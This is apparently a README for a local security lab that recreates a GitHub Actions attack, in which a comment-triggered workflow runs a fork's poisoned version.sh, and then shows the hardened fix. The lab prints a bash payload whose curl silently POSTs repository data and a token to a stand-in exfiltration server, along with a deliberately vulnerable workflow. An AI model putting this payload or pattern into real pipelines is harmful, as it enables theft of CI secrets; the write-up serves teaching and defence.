# 🔐 Sandbox 2 - Direct Bash Script Injection (project-akri/akri)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Direct Bash script injection without author verification |
| **Real Target** | project-akri/akri (CNCF project) |
| **Attacker** | hackerbot-claw (Feb 28, 2026) |
| **Trigger** | `issue_comment` on Pull Request - not `push` |
| **Result** | ❌ RCE confirmed - malicious script executed |
| **Fixed** | ✅ Attack blocked with `author_association` check |

> 💡 **Note:** This attack exploits the `issue_comment` trigger on a PR,
> not a `push` event. This means **a simple comment** on a PR is enough
> to trigger a sensitive workflow - no code merge required.

---

## 📁 Structure
```
sandbox-2-bash-injection/
│
├── vulnerable/                          ← ATTACKED VERSION
│   ├── .github/
│   │   └── workflows/
│   │       └── update-versions.yml     ← vulnerable workflow
│   └── scripts/
│       └── version.sh                  ← legitimate script (replaced by attacker)
│
├── fixed/                               ← SECURED VERSION
│   ├── .github/
│   │   └── workflows/
│   │       └── update-versions.yml     ← hardened workflow
│   └── scripts/
│       └── version.sh                  ← legitimate script
│
└── attacker/
    └── version.sh                      ← poisoned bash script
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker opens PR with poisoned version.sh           │
│                    ↓                                      │
│   2. Attacker comments "/version minor" on PR             │
│      ⚠️  ANY user can do this - no permission needed      │
│                    ↓                                      │
│   3. issue_comment trigger fires                          │
│      (exploits PR comment, NOT a push event)              │
│                    ↓                                      │
│   4. Workflow checks out FORK scripts                     │
│                    ↓                                      │
│   5. bash version.sh executes poisoned script             │
│                    ↓                                      │
│   6. curl POST → token → attacker server                  │
│                    ↓                                      │
│   ❌ RCE confirmed - data exfiltrated silently            │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   Add author_association == MEMBER/OWNER check            │
│                    ↓                                      │
│   Attacker is NONE → job skipped immediately              │
│                    ↓                                      │
│   ✅ Attack blocked - no script executed                  │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
PR Comment (/version)
      ↓
issue_comment trigger
      ↓
No author check ← ⚠️ VULNERABLE
      ↓
Checkout fork scripts
      ↓
bash version.sh
      ↓
curl → localhost:8888/exfil
      ↓
❌ Data exfiltrated
```

---

## ⚠️ Vulnerability Conditions

Two conditions must be met simultaneously:
```yaml
# ⚠️ Condition 1: no author_association check
# CRITICAL: any GitHub user can trigger this
# by simply commenting "/version" on any PR
jobs:
  update:
    if: |
      github.event.issue.pull_request != null &&
      contains(github.event.comment.body, '/version')
      # ← MISSING: author_association check

# ⚠️ Condition 2: fork code executed with token
steps:
  - uses: actions/checkout@v3
    with:
      ref: ${{ github.event.issue.pull_request.head.ref }}
      # ← DANGER: checks out attacker's fork scripts
  - run: bash scripts/version.sh
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      # ← DANGER: token accessible to attacker's script
```

---

## 💣 Malicious Payload

The attacker replaces the legitimate `version.sh` with this poisoned version:
```bash
#!/usr/bin/env bash
# ⚠️ MALICIOUS CODE - executes BEFORE legitimate code
# Silently exfiltrates data to attacker server

curl -s -X POST \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR" \
  -d "token=EXFILTRATED_TOKEN" \
  http://host.docker.internal:8888/exfil
# ↑ CRITICAL: token sent to attacker server here

# ✅ Legitimate code below - victim sees only this
update_version() {
    echo "Checking version..."
    echo "Version updated successfully!"
}
update_version
```

> 💡 **Why is this effective?**
> The malicious `curl` runs **silently before** the legitimate code.
> The workflow output shows only `"Version updated successfully!"` -
> the victim sees **no error**, while data has already been exfiltrated.

> 🔑 **Critical point:** The `author_association` is `NONE` for external users.
> Without checking it, **anyone on GitHub** can trigger this workflow
> by commenting `/version` - no fork approval, no code review needed.

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> When running locally with `act`, we simulate a GitHub event using a JSON file.
> The `event_issue_comment.json` mimics a real **PR comment event** from an
> **untrusted user** (`author_association: NONE`) commenting `/version minor`.
>
> This is exactly how the real hackerbot-claw attack was triggered —
> a simple comment on a PR, no special access needed.
```json
{
  "action": "created",
  "issue": {
    "number": 1,
    "pull_request": {
      "url": "https://api.github.com/repos/owner/repo/pulls/1",
      "head": { "ref": "main" }
    }
  },
  "comment": {
    "body": "/version minor",
    "author_association": "NONE"
  },
  "repository": {
    "full_name": "owner/repo"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated exfiltration server** running on your machine.
> **No real secrets are sent anywhere outside your machine.**
> Never run these attacks against real repositories without authorization.

### Step 1 — Start exfiltration server
```bash
# Terminal 2 — keep this running throughout the demo
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 — Copy malicious payload
```bash
# Terminal 1 — replace legitimate script with poisoned version
cp sandbox-2-bash-injection/attacker/version.sh \
   sandbox-2-bash-injection/vulnerable/scripts/version.sh
```

### Step 3 ❌ — Run Vulnerable Version
```bash
act issue_comment \
    --eventpath events/event_issue_comment.json \
    --secret-file .secrets \
    -W sandbox-2-bash-injection/vulnerable/.github/workflows/update-versions.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees nothing suspicious:**
```
✅ Success - Main Update version
| Checking version...
| Version updated successfully!
🏁 Job succeeded
```

**Terminal 2 - attacker receives the data:**
```
==================================================
TOKEN EXFILTRATED!
Data: repo=owner/repo&actor=nektos/act&token=EXFILTRATED_TOKEN
==================================================
❌ Attack succeeded - data exfiltrated silently
```

### Step 4 ✅ - Run Fixed Version
```bash
act issue_comment \
    --eventpath events/event_issue_comment.json \
    --secret-file .secrets \
    -W sandbox-2-bash-injection/fixed/.github/workflows/update-versions.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token -v
```

**Terminal 1 - job blocked immediately:**
```
expression evaluated to 'false'
Skipping job 'update'
author_association == NONE — not MEMBER or OWNER
✅ Job skipped — attacker blocked
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked — nothing exfiltrated
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Trigger | Any user via comment | `MEMBER`/`OWNER` only |
| `author_association` | Not checked | Verified |
| Checkout | Fork scripts | Main branch only |
| `GITHUB_TOKEN` | Exposed to script | Not exposed |
```yaml
# ✅ FIXED WORKFLOW
jobs:
  update:
    if: |
      github.event.issue.pull_request != null &&
      contains(github.event.comment.body, '/version') &&
      (github.event.comment.author_association == 'MEMBER' ||
       github.event.comment.author_association == 'OWNER')
      # ✅ CRITICAL: only trusted users can trigger

    permissions:
      contents: read    # ✅ minimum permissions

    steps:
      - uses: actions/checkout@v3
        # ✅ no fork ref - main branch code only
      - run: bash scripts/version.sh
        # ✅ GITHUB_TOKEN not exposed
```

---

## 🔑 Key Lesson

> ⚠️ **Always verify `author_association` for comment-triggered workflows.**
>
> The `issue_comment` trigger fires on **any PR comment** — including from
> completely untrusted external users. Without an `author_association` check,
> anyone on GitHub can trigger your sensitive CI/CD workflows.
>
> ✅ **Rule:** Only allow `MEMBER` or `OWNER` roles to trigger workflows
> that execute scripts or access secrets.
>
> 🔑 **Remember:** A simple comment is not just text —
> it can be a **remote code execution trigger**.

---

## 🔗 References

- [Real attack analysis — StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Actions security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [act — Local GitHub Actions runner](https://github.com/nektos/act)
